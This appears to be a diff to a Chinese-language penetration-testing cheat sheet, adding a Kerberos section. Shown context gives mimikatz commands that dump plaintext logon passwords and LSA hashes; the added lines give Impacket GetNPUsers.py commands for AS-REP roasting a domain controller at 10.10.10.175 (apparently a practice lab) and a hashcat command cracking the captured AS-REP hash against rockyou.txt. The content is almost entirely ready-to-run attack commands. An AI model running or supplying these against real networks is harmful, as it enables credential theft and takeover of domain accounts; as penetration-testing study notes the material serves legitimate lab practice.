@@ -353,3 +353,26 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnec
 抓取明文:` mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit `
 
 抓取hash:`mimikatz log "privilege::debug" "lsadump::lsa /patch" exit`
+
+
+
+## 域
+
+### kerberos
+
+```bash
+GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ #getusername and passwordhash #enable Do not require kerberos auth
+GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/FSmith
+```
+
+
+
+## 爆破
+
+### hashcat
+
+```bash
+#Kerberos 5 AS-REP etype 23
+hashcat   -m 18200  "$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:373ff0b4d7c69ce1aa8c8b1f49223620$d b82e60d9525c52bead5e4deda8555aed4fe2e9c362f0a70185be8fc81b4b59142e19f4a54cac42ca4be854009771ba92742509c89dd7464607658edb60c7814fdf62365bd550f223e5f7e84671f0427117f26561ad9952ba688b54df28d056db57c6f4f953acd4753b8d2b2b8a9330e0b9b8432e4280c134d16f38da6c04fa02952982f71760dbfd384f94a43c8befb9bd4a07939c31f68b3da113ba0e82af0dc9cedc826a7e6092130f904501c90d895b7b7e6f1a0087cf637150083018979b663b13afb42bb3c579be271f0d9c7db5905f13b670087c7f83b790f9bd8438eadaf00c829d2d2d5d891cb6eb6bbc61be8d9835140818f9a60b918342c6e113d" -a0  rockyou.txt
+```
+
